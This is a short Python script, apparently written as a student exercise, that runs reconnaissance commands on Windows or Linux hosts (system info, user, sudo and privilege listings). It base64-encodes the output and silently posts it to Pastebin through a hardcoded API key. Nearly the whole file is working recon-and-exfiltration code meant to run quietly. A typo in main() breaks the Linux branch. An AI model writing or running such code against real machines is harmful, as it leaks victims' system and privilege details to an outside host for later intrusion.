# Muhammad Iqbal Danarddatu #
# 2301913860 #

import requests
import subprocess
import os
import base64


def upld(msg):
    #our destination link/ip to send the information
    web = 'https://pastebin.com/api/api_post.php'
    # Enter the api
    api ={'api_dev_key' : 'OkPobdVFSbrP6HMm-1rGIud_4zOD6BYv',
          'api_paste_code' :  msg,
          'api_paste_name' : 'Target',
          'api_option' : 'paste'
          }
    # attempt to send the data
    try:
        send = requests.post(web, data=api)
    except:
        # SHH dont make any noisee
        pass

def linfam():
    # Host recon cmd in linux family (host name, user, privileges)
    run = ["uname -a","sudo -l","hostname"]
    data=[]
    # Run all the command above
    for i in run:
        # do the shell in linux
        temp1 = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
       # split the output between the string and error 
        str,strerr=temp1.communicate()
        if strerr != b'':
            #if error we will send to our information gateway too
            # SHH dont make any noisee 
            data.append(i)
            data.append(strerr.decode())
        else:
            # gather the data into 1 variable
            data.append(str.decode())
    # with \n will make your data looks clean
    data ="\n".join(data)
    # we pass to upload function
    upld(base64.b64encode(data.encode()))

def win():
     # Host recon cmd in windows (host name, user, privileges)
    run = ["systeminfo","whoami","whoami /priv"]
    data=[]
    # Run all the command above
    for i in run:
        # do the shell in windows with argument we add above
        temp1 = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        # split the output between the string and error # the most important is the str var, you can remove the strerr if you dont need error msg.
        str,strerr=temp1.communicate()
        if strerr != b'':
            #if error we will send to our information gateway too
            data.append(i)
            data.append(strerr.decode())
        else:
            # gather the data into 1 variable
            data.append(str.decode())
    # with \n will make your data looks clean
    data ="\n".join(data)
    # we pass to upload function
    upld(base64.b64encode(data.encode()))
    

def main():
    #checking is machine windows or linux family
    if os.name == "nt":
        win()
    else:
        linfaM()
main()








